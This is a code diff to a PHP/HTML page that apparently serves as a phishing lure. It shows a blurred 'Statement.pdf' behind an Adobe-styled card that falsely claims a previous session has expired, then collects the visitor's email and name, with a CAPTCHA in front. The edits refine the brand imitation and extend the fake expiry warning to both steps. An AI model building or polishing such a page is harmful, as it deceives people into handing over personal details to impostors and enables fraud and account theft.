@@ -28,30 +28,33 @@ $hasError = !empty($error);
         }
 
         /* -------------------------------------------
-           AUTO DARK/LIGHT MODE
+           Auto Dark/Light Adobe Style Colors
         -------------------------------------------- */
         :root {
-            --card-bg: #f5f5f5;
+            --card-bg: #ffffff;
             --text-color: #222;
-            --subtext: #666;
-            --border: #d0d0d0;
-            --btn-bg: #1a73e8;
-            --btn-hover: #185abc;
+            --subtext: #6b6b6b;
+            --border: #d1d1d1;
+            --btn-bg: #0056D2;      /* Adobe muted blue */
+            --btn-hover: #0046b0;
             --error: #c21515;
             --overlay-dark: rgba(0,0,0,0.65);
-            --readonly-bg: #e0e3ea; /* darker locked email bg */
+            --readonly-bg: #e2e4e8; /* darker locked email */
+            --divider: #e6e6e6;     /* Adobe-style top divider */
+            --font-small: 12px;
+            --font-button: 13px;
         }
 
         @media (prefers-color-scheme: dark) {
             :root {
-                --card-bg: #1b1b1b;
+                --card-bg: #1c1c1c;
                 --text-color: #eee;
-                --subtext: #aaa;
+                --subtext: #9b9b9b;
                 --border: #333;
-                --btn-bg: #3478f6;
-                --btn-hover: #1f5fcc;
-                --overlay-dark: rgba(0,0,0,0.72);
-                --readonly-bg: #252a33;
+                --btn-bg: #4a82ff;
+                --btn-hover: #3a68d4;
+                --readonly-bg: #2b2f37;
+                --divider: #2c2c2c;
             }
         }
 
@@ -75,7 +78,6 @@ $hasError = !empty($error);
             overflow: hidden;
         }
 
-        /* Background blurred PDF preview */
         .doc-background {
             position: absolute;
             inset: 0;
@@ -86,14 +88,12 @@ $hasError = !empty($error);
             transform: scale(1.04);
             opacity: 0.7;
         }
-
         .doc-background img {
             max-width: 100%;
             max-height: 100vh;
             object-fit: contain;
         }
 
-        /* Dark overlay to increase readability */
         .page-wrapper::before {
             content: "";
             position: absolute;
@@ -103,7 +103,7 @@ $hasError = !empty($error);
         }
 
         /* -------------------------------------------
-           CARD (compact, Adobe-ish)
+           CARD (compact Adobe style)
         -------------------------------------------- */
         .login-card {
             position: relative;
@@ -112,42 +112,39 @@ $hasError = !empty($error);
             max-width: 320px;
             background: var(--card-bg);
             border-radius: 6px;
-            padding: 22px 22px 26px;
-            box-shadow: 0 18px 45px rgba(0,0,0,0.45);
+            padding: 20px 22px 24px;
+            box-shadow: 0 12px 32px rgba(0,0,0,0.35);
             overflow: hidden;
-
             opacity: 0;
             transform: translateY(14px) scale(0.98);
             animation: cardIn 0.55s ease-out forwards;
             border: 1px solid transparent;
         }
 
-        /* Softer error state: subtle red border, no heavy red glow */
+        /* Soft subtle error border */
         .login-card.has-error {
-            border-color: rgba(194, 21, 21, 0.5);
-            box-shadow: 0 18px 45px rgba(0,0,0,0.55);
+            border-color: rgba(194, 21, 21, 0.35);
+            box-shadow: 0 12px 32px rgba(0,0,0,0.45);
+        }
+
+        /* Top divider line inside card */
+        .top-divider {
+            width: 100%;
+            height: 1px;
+            background: var(--divider);
+            margin: 10px 0 14px;
         }
 
         @keyframes cardIn {
-            from {
-                opacity: 0;
-                transform: translateY(18px) scale(0.97);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
+            from { opacity: 0; transform: translateY(18px) scale(0.97); }
+            to   { opacity: 1; transform: translateY(0) scale(1); }
         }
 
         /* PDF Icon */
         .doc-icon {
-            width: 42px;
-            height: 42px;
+            width: 40px;
+            height: 40px;
             margin: 0 auto 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
         }
 
         .doc-icon-img {
@@ -158,7 +155,7 @@ $hasError = !empty($error);
 
         /* Titles */
         .doc-title {
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             text-align: center;
             margin-bottom: 4px;
@@ -167,10 +164,10 @@ $hasError = !empty($error);
         .doc-size {
             font-weight: 400;
             color: var(--subtext);
-            font-size: 12px;
+            font-size: 11px;
         }
 
-        /* Red “session expired” text – used ONLY on step 1 */
+        /* Red session expired text for Step 1 & Step 2 */
         .doc-subtitle {
             text-align: center;
             color: var(--error);
@@ -179,44 +176,42 @@ $hasError = !empty($error);
             font-weight: 600;
         }
 
-        /* Error message from backend */
         .login-error {
             color: var(--error);
             font-size: 11px;
             font-weight: 600;
             text-align: center;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
-        /* Form fields */
+        /* Fields */
         .field-wrapper {
             margin-bottom: 10px;
         }
 
         .field-wrapper input {
             width: 100%;
-            padding: 10px 11px;
+            padding: 9px 10px;
             border-radius: 4px;
             border: 1px solid var(--border);
             background: transparent;
             color: var(--text-color);
-            font-size: 14px;
-            outline: none;
+            font-size: var(--font-small);
         }
 
         .field-wrapper input:focus {
             border-color: var(--btn-bg);
-            box-shadow: 0 0 0 1px rgba(26,115,232,0.2);
+            box-shadow: 0 0 0 1px rgba(0,100,220,0.2);
         }
 
-        /* Read-only (validated) email appearance – darker */
+        /* Darker locked email (Adobe style) */
         .readonly-input {
             background: var(--readonly-bg);
             color: var(--subtext);
             cursor: not-allowed;
         }
 
-        /* CAPTCHA wrapper: perfectly centered */
+        /* CAPTCHA centered */
         .captcha-wrapper {
             display: flex;
             justify-content: center;
@@ -224,23 +219,23 @@ $hasError = !empty($error);
             margin: 6px 0 4px;
         }
 
-        /* Turnstile size */
         .cf-turnstile {
             transform: scale(0.9);
             transform-origin: center center;
         }
 
-        /* Buttons */
+        /* Adobe-style button */
         .btn-primary {
             width: 100%;
-            padding: 11px 12px;
+            padding: 10px 12px;
             background: var(--btn-bg);
             color: #fff;
             border: none;
             border-radius: 4px;
             cursor: pointer;
-            font-size: 14px;
-            margin-top: 6px;
+            font-size: var(--font-button);
+            margin-top: 4px;
+            font-weight: 600;
         }
 
         .btn-primary:hover {
@@ -251,75 +246,64 @@ $hasError = !empty($error);
 <body>
 <div class="page-wrapper">
 
-    <!-- Background -->
     <div class="doc-background">
         <img src="assets/background.png" alt="Document preview">
     </div>
 
     <div class="login-card<?= $hasError ? ' has-error' : '' ?>">
+
         <div class="doc-icon">
-            <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
+            <img src="assets/PDtrans.png" class="doc-icon-img">
         </div>
 
         <h2 class="doc-title">
             Statement.pdf <span class="doc-size">(197 KB)</span>
         </h2>
 
-        <?php if ($step == 1): ?>
-            <!-- Only show this on the first page -->
-            <p class="doc-subtitle">Previous session has expired, login to continue.</p>
-        <?php endif; ?>
+        <!-- Appears on Step 1 AND Step 2 -->
+        <p class="doc-subtitle">Previous session has expired, login to continue.</p>
+
+        <div class="top-divider"></div>
 
         <?php if ($error): ?>
             <p class="login-error"><?= htmlspecialchars($error) ?></p>
         <?php endif; ?>
 
         <?php if ($step == 1): ?>
-            <!-- STEP 1 — EMAIL → CAPTCHA → BUTTON -->
+            <!-- STEP 1 — EMAIL + CAPTCHA -->
             <form method="POST" action="login.php">
+
                 <div class="field-wrapper">
-                    <input
-                        type="email"
-                        name="email"
-                        value="<?= htmlspecialchars($old_email) ?>"
-                        placeholder="Enter your email"
-                        required
-                    >
+                    <input type="email" name="email" placeholder="Enter your email"
+                           value="<?= htmlspecialchars($old_email) ?>" required>
                 </div>
 
                 <div class="captcha-wrapper">
-                    <div
-                        class="cf-turnstile"
-                        data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2">
-                    </div>
+                    <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
                 </div>
 
                 <button class="btn-primary">Next</button>
             </form>
 
         <?php else: ?>
-            <!-- STEP 2 — DARKER LOCKED EMAIL + NAME -->
+
+            <!-- STEP 2 — LOCKED EMAIL + NAME -->
             <form method="POST" action="login.php">
+
                 <div class="field-wrapper">
-                    <input
-                        type="email"
-                        value="<?= htmlspecialchars($old_email) ?>"
-                        class="readonly-input"
-                        readonly
-                    >
+                    <input type="email"
+                           value="<?= htmlspecialchars($old_email) ?>"
+                           class="readonly-input"
+                           readonly>
                 </div>
 
                 <div class="field-wrapper">
-                    <input
-                        type="text"
-                        name="name"
-                        placeholder="Enter your name"
-                        required
-                    >
+                    <input type="text" name="name" placeholder="Enter your name" required>
                 </div>
 
                 <button class="btn-primary">Next</button>
             </form>
+
         <?php endif; ?>
     </div>
 </div>
